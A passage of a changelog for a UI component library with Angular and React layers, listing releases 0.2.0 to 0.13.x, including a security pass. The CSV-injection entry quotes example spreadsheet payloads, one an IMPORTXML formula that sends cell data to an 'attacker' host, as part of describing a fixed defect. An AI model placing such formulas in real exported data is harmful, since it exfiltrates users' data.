  and components re-render their strings — and, with `locale`, their Intl
  formats — without a reload; apps no longer have to fetch the catalog before
  `bootstrapApplication`. The object form is unchanged. (React providers
  already re-resolve when their `config` prop changes.)

### Fixed (inputs)

- **The number box ignored `provideOgeInputsConfig({ locale })`** and parsed
  with `LOCALE_ID` (en-US unless set), so "1.250,50" became 1.2505 in an app
  that set its locale through the config — the date editors already honoured
  it.
- New **`[width]`** on every text-style field (number = px, or any CSS length)
  — `--oge-input-width` was global only.
- Under Signal Forms `[formField]`, the schema's `maxLength()` already drives
  the counter and the native `maxlength` — do not bind `[maxLength]` as well
  (Angular rejects it, NG8022). Now covered by a test and documented.

## 0.13.1 — 2026-09-06

Every package moves to 0.13.1 together. A patch release by version number, but
the substance is a security pass over the whole suite plus the React grid's
remaining slices — see below.

### Fixed (security)

- **No component uses a trusted-HTML API any more.** Search highlighting was
  the last one: the kernel escaped the cell text and the grid, tree list and
  tree view handed the result to `bypassSecurityTrustHtml` (Angular) or
  `dangerouslySetInnerHTML` (React). Safe, but unusable — a codebase that bans
  those APIs by lint rule lost those components outright, and a grid showing
  reported, hostile content is exactly where such a ban lives. The new
  `buildSearchHighlightSegments` returns the matched and unmatched _runs_ of
  the text and each layer emits real text nodes and `<mark>` elements, so the
  sink is gone rather than defended. `buildSearchHighlightHtml` stays exported
  and deprecated for hosts that were calling it directly.

- **`?framework=react` was silently dropped on every redirecting docs page.**
  Angular's string `redirectTo` builds a `UrlTree` with no query params, and
  under SSR that became an HTTP 302 that stripped them before the bundle
  loaded — so a React reader following a shared link to `…/tabs/routed` landed
  on the Angular version of a page their layer does not cover, with none of
  the coverage notice that exists to prevent exactly that. The three child
  redirects now use the function form and carry the query string across.

- **CSV formula injection (CWE-1236) in every exporter.** `getCsv()` /
  `exportCsv()` on the grid, tree list and pivot — and the clipboard TSV path
  — quoted cells per RFC 4180 but left a cell opening with `=`, `+`, `-`, `@`,
  tab or CR intact, so a spreadsheet evaluated it on open (`=cmd|…!A1`,
  `=IMPORTXML("http://attacker/?"&A1)`). Those cells now carry a leading
  apostrophe. Plain numbers are exempt, so a `-5` column stays numeric, and
  `formulaGuard: false` opts out for machine-read output. The `.xlsx`
  exporters write typed cells and were never affected.
- **`javascript:` URLs executed from React `href`/`src` bindings.** Angular's
  `[href]` sanitizes through `DomSanitizer`; React's does not, so a
  data-driven `url` on a menu item, breadcrumb or menubar item ran on click in
  the React layer only. `<OgeMenuList>`, `<OgeBreadcrumb>`, `<OgeMenubar>`,
  the three select-family item images, the file uploader preview and the
  uploader's own download anchor now route through the new `sanitizeUrl` /
  `sanitizeResourceUrl` (exported from `@oge-ui/behavior`, for host code that
  renders links from the same data).
- **`<OgeCalendar>` (React) opened on the current month** instead of the month
  of its bound value: the re-anchor effect only ran on a _later_ value change,
  while Angular's `onValueWritten` runs for the initial write too. Only
  visible outside the month a fixture was written in — which is why the spec
  suite caught it in September and not in August.

### Added

- **`@oge-ui/react-grid` slices C and D.** Editing in all five modes —
  `cell`, `row`, `batch`, `popup` and `form` (the last two through a real
  `<OgeForm>`) — with the command column, the add/save/discard toolbar,
  `addRow` / `editRow` / `deleteRow` / `saveChanges` / `discardChanges` /
  `hasChanges` on the handle, the ten editing events, and per-column
  `editable` / `required` / `validators` / `renderEditor`. Plus the Excel-style
  header filter (dates grouped by year), the filter panel with the visual
  filter builder (`<OgeFilterBuilderGroup>`), a controlled `filterValue`, the
  column chooser (drag to reorder), column bands via `bandCaption`, row and
  header context menus, `highlightChanges`, and deferred selection
  (`selectionDeferred` / `selectionFilter`).

  None of it is a reimplementation: `OgeGridEditingCore`'s editor bridge was
  designed for this split — Angular fills it with `FormControl`s, React with
  draft state — and the header-filter, filter-builder and selection kernels
  are the same `@oge-ui/behavior` functions the Angular grid calls.

- **`@oge-ui/react-grid/export-excel` and `/export-pdf`.**
  `exportGridToExcel(handle, options)` and `exportGridToPdf(handle, options)`,
  taking the grid's imperative handle where the Angular signature takes the
  component. Getting there meant doing what the workspace's sharing rule asks
  instead of the easy thing: the pure `buildExcelWorkbook` and
  `buildPdfDocument` moved into the new `@oge-ui/behavior/export-excel` and
  `@oge-ui/behavior/export-pdf` entry points — non-trivial and framework-free,
  so extracted rather than copied — with `exceljs`, `jspdf` and
  `jspdf-autotable` as optional peers there. `@oge-ui/grid/export-*` keeps its
  download flow and re-exports the builder, so its public API is unchanged.

  What is still outstanding before the React grid joins the parity gate is
  documentation, not code: six feature pages still show the React shell notice
  rather than branching.

### Changed

- Angular `22.0.6 → 22.1.5` (with the CLI/devkit at `22.1.7`), Nx
  `23.1.0 → 23.2.0`, Vite `8.0.9 → 8.2.2`, esbuild `0.27 → 0.28`, plus `qs`
  and `uuid` overrides — `npm audit` goes from 40 findings (27 high) to zero.
  The high one that mattered was `@angular/platform-server`'s SSR XSS
  (GHSA-vpx6-8pjr-4g3v), which the docs site prerenders through. The unused
  `@angular-devkit/build-angular` direct dependency was dropped; the workspace
  builds on `@angular/build` only.
- CI gains an `audit` job (fails at moderate and above), a CodeQL
  `security-extended` scan, and Dependabot with the Angular and Nx families
  grouped so peer resolution never sees a partial bump.
- The docs site sends a full security-header set (CSP, HSTS, frame-ancestors,
  Permissions-Policy, COOP/CORP) and publishes `/.well-known/security.txt`.
- `SECURITY.md` now states what the suite actually does with untrusted data —
  including that upload validation is UX, not a server control — and
  `docs/ARCHITECTURE.md` records the same rules as workspace invariants.

## 0.13.0 — 2026-08-23

### React layer: three more families

- **`@oge-ui/react-overlay`** is now the whole overlay family: `<OgeTooltip>`,
  `<OgeContextMenu>`, `<OgeModal>` + `OgeModalProvider` (async close guards,
  drag/resize, focus trap, initial-focus resolution) and `<OgeToastRegion>` +
  `useOgeToast` (stacking, pause-on-hover timers, coalescing, promise morphing)
  join the anchored panel and the menu. The tooltip, modal and toast cores
  moved into `@oge-ui/behavior` and the Angular overlay was rewired onto them.
- **`@oge-ui/react-upload`** — `<OgeFileUploader>` with its 28 callbacks and
  six render-prop slots, `<OgeUploadDropZone>` / `<OgeUploadTrigger>`, config
  and transport providers. The upload engine (chunk planning, queue, XHR
  adapter, drag/paste reading, validation) and a new `OgeFileUploaderCore`
  list machine moved into `@oge-ui/behavior`; the Angular uploader is now a
  thin seam over them (83 specs unchanged). `<OgeForm>`'s `fileUploader`
  editor renders the real uploader — the last forms exception closed.
- **`@oge-ui/react-grid`** (new) — `<OgeGrid>` and `<OgePager>` over the grid
  engine, shipped **in slices** because the Angular grid is the suite's
  largest surface. Slices A and B are in: multi-column sorting, a typed filter
  row with an operator menu, global search, paging, row and column
  virtualization with measured heights, windowed remote loading and infinite
  scrolling, single/multiple/checkbox selection with shift ranges and Ctrl+A,
  Excel-like keyboard navigation, a focused row, pinned/resizable/reorderable
  columns, responsive hiding, `stateKey` persistence, CSV and clipboard —
  plus grouping with a drag-and-drop group panel, group/footer/total
  summaries, custom summaries and deferred group loading, master-detail
  (`renderDetail`), `renderRow` / `renderNoData`, and row drag with
  `onRowReordered`. Editing, header filters, the filter builder, column
  chooser and context menus are the next slices; every gap is dated and
  recorded in `docs/REACT-PARITY.md`, and the React API table documents
  exactly what ships.
- **`@oge-ui/react`** re-exports the three and its combined stylesheet
  includes them.

### `@oge-ui/behavior`

- Grid engine additions: `OgeGridStateCore` (the state slices composed, with
  `loadOptions`, the serializable snapshot and the cross-slice invariants as
  a host-driven `reconcile()`), `OgeGridDataCore` (switchMap loads, windowed
  block fetching, push patching — the framework-free port of the Angular data
  adapter), and the grid's message catalog, config shape, option objects and
  event payloads, single-sourced for both layers. `@oge-ui/grid` re-exports
  them unchanged.
- The pager's stylesheet moved to `packages/grid/src/lib/pager/pager.scss`,
  loaded by the Angular pager and compiled into the React grid's
  `styles.css` — one pager stylesheet, two render layers.

### Docs site

- **Prerendered.** All 108 routes are now static HTML (Angular SSG) with a
  per-route `<title>` (`<Component> | OGE UI`), canonical URL and meta
  description — the cause of the "discovered, not indexed" backlog in Search
  Console. `robots.txt` explicitly allows the AI crawlers (GPTBot, ClaudeBot,
  PerplexityBot, Google-Extended, CCBot, …) and names the sitemap; the Vercel
  rewrite falls back to `index.csr.html` for unknown routes.
- The React views of the overlay, upload and data-grid families render on the
  same routes as the Angular views (ADR 0002); the `llms.txt` generator no
  longer drops `<code>&lt;Tag&gt;</code>` spans.

## 0.12.0 — 2026-08-14

### New render layer: React

The suite now ships a **native React layer** — real React components, not
wrappers. One framework-free engine drives both layers (ADR 0001): data
arithmetic in `@oge-ui/core`, interaction and accessibility in
`@oge-ui/behavior`, one stylesheet, one message table. Every family extracted
to the engine was rewired in Angular in the same change, with its existing
specs passing unchanged.

- **`@oge-ui/react`** — umbrella package; installs and re-exports every
  `@oge-ui/react-*` family so an app can install once and import from one path.
- **`@oge-ui/react-overlay`** — the anchored-panel substrate: viewport-aware
  positioning with flip and clamp, the single Escape stack, focus trap,
  ref-counted scroll lock.
- **`@oge-ui/react-buttons`**, **`@oge-ui/react-inputs`**,
  **`@oge-ui/react-tabs`**, **`@oge-ui/react-layout`**,
  **`@oge-ui/react-navigation`** — the five component families, API member for
  API member with their Angular counterparts. React idioms where the framework
  requires them: controlled/uncontrolled pairs (`value` + `onValueChange` /
  `defaultValue`), imperative handles through `forwardRef`, render props in
  place of `TemplateRef`, context providers in place of DI tokens. Every
  deliberate difference is recorded in `docs/REACT-PARITY.md`.

The docs are **one site, not two**: a global framework switch stamps
`<html data-framework>`, rides in the URL as `?framework=react`, and every
component page renders the chosen layer on the same route. Coverage is
page-granular, so a React reader on an Angular-only page gets a notice instead
of syntax they cannot use. A cross-framework parity gate compares the two API
tables member for member on every build.

### New package

- **`@oge-ui/upload`** — file uploader with a transport engine (chunking,
  retry, progress, abort), drag & drop from an external drop zone, per-file
  validation with the rejection reason kept on the list, and a roving-tabindex
  file list.

### `@oge-ui/behavior`

- The shared engine grew to cover the input commit/debounce pipeline, the
  select-list machine (filtering, grouping, lazy item sources), the dropdown
  virtualizer, number/date/calendar/slider math, the anchored-panel machine and
  the layout, tabs and navigation decision layers.
- **Now tested framework-free**: every module carrying a decision has a spec
  beside it (49 → 664 tests), plus a barrel guard, since that barrel is the
  React layer's entire import surface. Two defects it found: the scroll lock
  could leave its own `padding-right` behind on release, and the React tree
  view painted its first frame with no roving tab stop, which made the
  virtualized tree a scrollable region with no keyboard access (WCAG 2.1.1).

### Accessibility

- In-prose links across the docs site now carry a persistent underline
  (axe `link-in-text-block`) — colour alone was the only signal.

## 0.11.0 — 2026-08-11

### New package

- **`@oge-ui/charts`** (commercial) — data visualization on a
  **dependency-free SVG kernel** (no D3, no Chart.js, no canvas library; the
  only suite dependency is `core`). `<oge-chart>` ships sixteen cartesian
  series types — `line`, `spline`, `stepLine`, `area`, `splineArea`,
  `stepArea`, `stackedArea`, `fullStackedArea`, `bar`, `stackedBar`,
  `fullStackedBar`, `rangeBar`, `scatter`, `bubble`, `rangeArea`,
  `candlestick` — over pure engines for 1-2-5 nice-tick scales,
  calendar-true time axes, logarithmic axes, multi value axes, stacking with
  separate negative branches and strip lines. Interaction: cursor-centered
  wheel zoom, drag-select zoom and Shift-pan with Escape reset
  (`[(visualRange)]` two-way), crosshair, single/`shared` tooltips with
  templates, an interactive legend that spotlights its series on hover,
  point/series selection, plot annotations (`point` callouts and `text`
  labels with an HTML template) and per-series value labels.
  `<oge-pie-chart>` adds pie/doughnut with anti-overlap outside labels and
  small-value grouping; `<oge-polar-chart>` adds radar/polar (line/area
  loops, scatter, sector bars, `spider` grids); `<oge-range-selector>` is
  the overview strip whose `[(value)]` pairs with a chart's
  `[(visualRange)]`. **Performance:** one `<path>` per series plus automatic
  **LTTB downsampling** to ~one point per pixel for oversized series (50k+
  points fluid; hit-testing keeps the full data). **Accessibility** (no APG
  chart pattern exists): `role="img"` labels, a screen-reader data table,
  real legend buttons and keyboard point inspection with live-region
  announcements — none of the reference libraries ship the latter two.
  Image export lives in the dependency-free `@oge-ui/charts/export-image`
  entry (inline-styled SVG serialization + PNG rasterization).

### `@oge-ui/gantt`

- **v0.2 feature wave:** `workCalendar` work-time calendars (off-day
  shading; auto-scheduling rolls pushed starts onto working days and keeps
  durations in working days) with per-resource `calendar` overrides;
  multi-resource assignment (scalar or array `resourceId` stores with
  shape-preserving write-back, a tag editor in the dialog and bar labels);
  `showResourceWorkload` utilization band with overallocation marks; hover
  tooltips with `*ogeGanttTooltipTemplate`; and three lazy export entry
  points — `export-excel` (exceljs), `export-pdf` (jspdf, the chart drawn
  as vector graphics) and the dependency-free `export-image` PNG.
- **Usability wave:** built-in right-click menu (edit, new task/subtask,
  indent/outdent, delete), double-click or **draw on empty chart space** to
  create a task at that date, MS Project-style Alt+Shift+Left/Right
  reparenting, a toolbar Today button, an empty state with a create
  shortcut — plus a visual refresh (segmented toolbar pills, gradient bars
  with hover lift, glowing today line).
- **Fixes from live use:** resize handles are reachable again (bar labels
  no longer intercept the pointer), dragging the earliest/latest task no
  longer re-anchors the whole chart (the rendered range only widens), and
  tooltips/drag tips never disappear under the sticky scale header.

### `@oge-ui/scheduler`

- Built-in right-click menu: edit/delete on chips through the guarded
  pipelines (recurrence occurrence/series scope included) and a prefilled
  "new appointment" on empty cells; toolbar and chips share the new visual
  language (segmented pills, gradient chips, glowing now-line).

### i18n

- Config-level `locale` for the scheduler and the date editors
  (`OgeInputsConfig.locale` / `OgeSchedulerConfig.locale`; per-instance
  `[locale]` wins) — the same pattern the gantt and charts shipped with.

## 0.10.0 — 2026-08-10

### New components

- **`OgeMenubar`** (`@oge-ui/navigation`) — the WAI-ARIA APG menubar: roving
  tabindex, the full keyboard walk (a leaf's ArrowRight hops to the next bar
  item with its menu open, Escape unwinds one level at a time), `openMode`
  `click | hover` on the top level only, and a **container-width** hamburger
  collapse (`compactBelow`, core's pure `resolveMenubarCompact`). `url` items
  are real links, `activeKey` renders `aria-current="page"` — no router
  dependency. The docs open with the APG's own caveat that a `<nav>` of links
  usually serves site navigation better.
- **`OgeBreadcrumb`** (`@oge-ui/navigation`) — the APG breadcrumb verbatim:
  a `<nav>` landmark, an ordered list of real links, `aria-current="page"` on
  the non-interactive last crumb, and **no invented keyboard behavior**.
  `collapseMode: 'auto'` folds the oldest middle crumbs against the
  container width (core's `fitToolbarItems` reused, no second kernel) — and
  unlike the references the collapsed crumbs stay reachable as links in the
  ellipsis menu.
- **`OgeSlider` + `OgeRangeSlider`** (`@oge-ui/inputs`) — the APG slider and
  multi-thumb patterns as bare editors on `OgeControlBase` (Signal Forms,
  reactive and `[(value)]` with zero new bridge code): live drag commits
  throttled by `[debounce]`, `slideEnded` at release, **Escape cancels the
  gesture** (no reference slider offers it), dynamic aria constraints between
  range thumbs (`minRange`), `formatValue` feeding the bubble, the end labels
  and `aria-valuetext` alike, ticks with labels, Kendo-style `showButtons`,
  and `editorType: 'slider'` inside `<oge-form>`.
- **`OgeProgressBar` + `OgeLoadIndicator` + `OgeSkeleton`**
  (`@oge-ui/layout`) — the loading trio canonicalizing the hand-drawn
  spinners and shimmers across the suite. `role="progressbar"` with the ARIA
  rule most libraries miss: **indeterminate omits `aria-valuenow`** entirely
  (`value: null`); `bufferValue` and `chunkCount` variants, `severity`
  colors, a one-shot `completed`; the ring slows rather than freezes under
  `prefers-reduced-motion`; the skeleton is always `aria-hidden` decoration
  with a `lines` input rendering the tapered multi-line placeholder stack.

### Changed

- The canonical `OgeMenuItem` (`@oge-ui/overlay`) grew **nested submenus**
  (`items` on any item — one anchored panel per level on the shared Escape
  stack; `'escape'`/`'back'` absorbed per level, `'select'`/`'tab'` chained
  to the root owner), plus `url` link rows, `badge` and
  `shortcut`/`aria-keyshortcuts`. Every menu owner — grid and tree-list
  context menus, the drop-down button, the toolbar overflow — inherits all of
  it with zero consumer changes.
- The grid's filler-row class is now `.oge-grid-skeleton` (the canonical
  component owns `.oge-skeleton`), and the shared `.oge-spinner` gained its
  missing `prefers-reduced-motion` rule.
- The accordion docs page's first demo is `collapsible`, so the page's first
  touch toggles intuitively; the non-collapsible contract lives in the
  switches demo.

### Fixed

- Menubar/drop-down focus race: pending menu focus now applies after render,
  so switching bar items never lands keyboard focus on a stale item list.
- Splitter: removed a dead `?? []` that warned NG8102 on every build.

## 0.9.0 — 2026-08-09

### New components

- **`OgeCard`** (`@oge-ui/layout`) — a content surface that is **one component,
  not a sub-component army**: the sections are attribute slots
  (`[ogeCardMedia]`, `[ogeCardActions]` with `align`, `[ogeCardFooter]`,
  `[ogeCardAvatar]`, `[ogeCardHeaderActions]`, `[ogeCardSeparator]`) and
  everything else projected is the content. `stylingMode`
  `outlined | raised | filled | flat` rests on the new `--oge-shadow-card`
  token, `size` scales density, `severity` draws a status rail, `loading`
  swaps content for an `aria-busy` skeleton, and `interactive` is a
  visual-only hover/focus-within lift. **No role and no clickable input, on
  purpose** — there is no WAI-ARIA card pattern; the accessible stretched-link
  pattern is a documented demo instead of an API.

### Changed

- New design token: `--oge-shadow-card` (resting card elevation, dark theme
  override included).
- The dev-app's hand-rolled card boxes — the playground stat tiles and
  sidebar, and five scroll-log/state panels — now render `<oge-card>`.

### Fixed

- **Pivot**: the collapsed field panel now contains its toggle button and sits
  above the sticky column headers, which used to paint over it and swallow its
  clicks.
- **Stepper**: the connector rail is derived from the header padding and
  indicator size, so it runs exactly through every indicator centre in both
  orientations; completed steps tint their outgoing rail, and the active
  indicator gains a soft halo.
- **Drawer**: `overlay`/`push` panels keep their full size and only translate —
  a compositor-only animation with no mid-gesture reflow — on a decelerate
  curve, with a scoped backdrop blur.

## 0.8.0 — 2026-08-09

### New package

- **`@oge-ui/forms`** — form layout over the `inputs` editors. `OgeForm` takes
  three binding modes on one component: `[fieldTree]` (Angular Signal Forms),
  `[formGroup]` (reactive forms) and `[(formData)]` (a plain model over an
  internally owned `form()`); the mode is derived, never configured.
  Validation is Signal Forms throughout — `validationRules` compiles to a
  schema, so there is no second engine. Responsive columns are `@container`
  queries on the form's own inline size rather than window width, and
  `<oge-form-tabs>` / `<oge-form-accordion>` / `<oge-form-steps>` wrap the
  tabs, layout and navigation components instead of copying them.

### New components

- **`OgeSplitter`** (`@oge-ui/layout`) — the WAI-ARIA APG window splitter:
  focusable `role="separator"` tracks in one CSS grid, `fr`-ratio sizing with
  `'<n>px'` / `'<n>%'` escape hatches, collapse-to-`inert`, pointer capture and
  self-recursive nesting.
- **`OgeToolbar`** (`@oge-ui/layout`) — the APG toolbar: `role="toolbar"`, a
  roving tabindex over its own buttons _and_ the controls you project,
  before/center/after groups, and an overflow menu for the commands that stop
  fitting. Per-item `overflowPriority` decides which yield first, independently
  of their position — the reference toolbars drop strictly from the end.
- **`OgeDrawer`** (`@oge-ui/navigation`) — `overlay`, `push` or `side`, on four
  logical edges. **Modality is derived from the mode**, not configured
  separately: `overlay`/`push` cover or displace the content and are dialogs
  (`role="dialog"`, `aria-modal`, focus trap, Escape, `inert`); `side` shares
  the row and is a landmark. `compactBelow` measures the drawer's own container
  rather than the window.
- **`OgeStepper`** (`@oge-ui/navigation`) — a linear or free wizard. There is no
  APG stepper pattern, so it is an ordered list of `<button>` headers carrying
  `aria-current="step"` with `role="group"` bodies — **one semantic in both
  orientations**, where Angular Material swaps `tablist` for `aria-current`
  with the layout. `linear`, `editable` and an async `stepGuard` gate the flow,
  and every refusal reports why through `stepBlocked`.

### Changed

- The `.oge-toolbar` markup was duplicated in the grid (14 uses), the tree list
  (12) and the pivot grid (5). All three now render `<oge-toolbar>`, so they
  gained the overflow menu and the APG keyboard model; the CSS namespace moved
  to `@oge-ui/layout` and the grid's own toolbar buttons became `.oge-tool-*`.
- The grid and the tree list render `<oge-form>` for their `form` and `popup`
  edit surfaces, retiring that duplication too.
- `@oge-ui/overlay` now exports the focus trap, the ref-counted scroll lock and
  the shared Escape stack, so a modal surface in another package joins _that_
  ordering rather than growing a second one — a popup opened inside a drawer
  closes before the drawer does.
- `OgeMenuItem` gained optional `icon` / `iconClass`, so a command keeps its
  icon when it collapses into an overflow or context menu.
- `@oge-ui/grid`'s `OgeToolbarItem` template directive is now
  **`OgeGridToolbarItem`** (the selector `[ogeToolbar]` is unchanged), freeing
  the name for the layout toolbar's declarative child.
- The button `autoRepeat` docs call their use case "spinner/counter buttons"
  rather than "stepper", now that a stepper component exists.

### Fixed

- The toolbar re-read `getComputedStyle` and every item's size on every resize
  frame; style and per-item layout reads now stay off the resize path.
- `overflowChanged` stopped firing when only the container width changed.
- `hideItem()` / `enableItem()` silently did nothing for declarative
  `<oge-toolbar-item>` children.

## 0.7.0 — 2026-08-08

### Breaking changes

- Public types without the `Oge` prefix were renamed: `EditingSlice` →
  `OgeEditingSlice`, `BuilderGroup` → `OgeBuilderGroup`, `BuilderCondition` →
  `OgeBuilderCondition`, `FilterBuilderField` → `OgeFilterBuilderField`,
  `SelectionMode` → `OgeSelectionMode`, `PivotStateStore` →
  `OgePivotStateStore`, `PivotAxisLine` → `OgePivotAxisLine`,
  `PivotHeaderCell` → `OgePivotHeaderCell`, `PIVOT_FIELD_DRAG_TYPE` →
  `OGE_PIVOT_FIELD_DRAG_TYPE`.
- `OgeFilterBuilderGroup` outputs renamed to match the house event naming:
  `changed` → `treeChanged`, `remove` → `removeRequest`.

### New packages

- **@oge-ui/tabs** — tab strip and tab panel: declarative or data-driven tabs,
  deferred rendering with keep-alive, closable tabs with async guards, overflow
  navigation, drag reorder and router integration.
- **@oge-ui/layout** — accordion following the WAI-ARIA pattern: single or
  multiple expansion, lazy content, async expand guards, header actions and
  invalid-section jumping.
- **@oge-ui/navigation** — tree view over flat or nested data: tri-state
  checkboxes, ancestor-preserving search, load-on-demand children, virtual
  scrolling and drag & drop reparenting.

### Documentation for AI coding assistants

- Every package now publishes a machine-readable API reference. `llms.txt`
  (an [llmstxt.org](https://llmstxt.org) index), `llms-full.txt` (conventions,
  every documented member and every demo) and one file per package are served
  from the site **and shipped in each tarball** at
  `node_modules/<package>/llms.txt`.
- `ng add @oge-ui/<package>` works for every publishable package: it registers
  an optional theme stylesheet and writes an OGE usage block into the project's
  `AGENTS.md` (opt out with `--skip-agents-file`).
- Docs snippets are now complete standalone components, compiled in CI under
  `strictTemplates` — what you copy from the site builds.
- Every exported symbol has an API-reference entry; internals that are exported
  for the suite's own packages are labelled as such.

### Overlay

- **overlay:** `OgeModal` dialog primitive — focus trap, ref-counted scroll
  lock, async `closeGuard`, typed `close(result)`, opt-in drag/resize/
  fullscreen and `inertBackground`; `OgeModalService.open()` for imperative
  use. All open surfaces now share one Escape stack.
- **overlay:** `OgeToastService` notifications — severity sugar, stacking per
  position, pause on hover/focus/tab-hidden, duplicate coalescing with a live
  counter, `promise()` with in-place morph, live-region announcers.
- **grid, tree-list:** edit-popup and filter-builder dialogs migrated onto
  `oge-modal`.

### Other

- **inputs:** `OgeTreeSelect` editor.
- **core:** shared `async-guard`, `nav-index` and `type-ahead` utilities behind
  the new families.
- **dev-app:** AI section with its own sidebar heading, component families
  grouped and sorted in the sidebar, three new gallery cards.
- **repo:** CI no longer depends on Nx Cloud; workspace-wide prettier pass;
  npm metadata (descriptions, keywords) for every package.

## 0.6.0 — 2026-08-07

- **inputs:** date editors (`OgeCalendar`, `OgeDateBox`, `OgeDateRangeBox`)
  built on native `Date` + `Intl` — no date library.
- **inputs:** bare toggle controls (`OgeCheckBox`, `OgeSwitch`,
  `OgeRadioGroup`) and `OgeAutocomplete`.
- **grid:** cell editors unified onto the `oge-*-box` inputs; popup editing
  polish.
- **dev-app:** site version badges driven from a single constant.

## 0.5.0 — 2026-08-06

- First release of `@oge-ui/buttons`, `@oge-ui/overlay`, `@oge-ui/inputs`,
  `@oge-ui/tree-list`, `@oge-ui/pivot` and the `oge-ui` umbrella.
- **licensing:** open-core split — `@oge-ui/pivot` becomes source-available
  commercial; every other package is MIT with a public MIT-forever pledge.
- **inputs:** `OgeSelectBox` and `OgeTagBox` dropdown editors.
- **pivot:** field management, analytics UX, virtualization, remote data,
  state persistence and CSV/Excel export.
- **tree-list:** grid-parity feature waves — editing modes, header filters,
  drag & drop, lazy loading.
- Community health files (contributing guide, security policy, templates).

## 0.3.0 — 2026-08-05

- **core, grid:** sort-key precomputation and cached date formatting;
  grouping, summaries, state persistence, CSV/Excel/PDF export hooks.

## 0.2.0 — 2026-08-05

- Initial public versions of `@oge-ui/core` (data engine) and
  `@oge-ui/grid` (virtualized data grid).
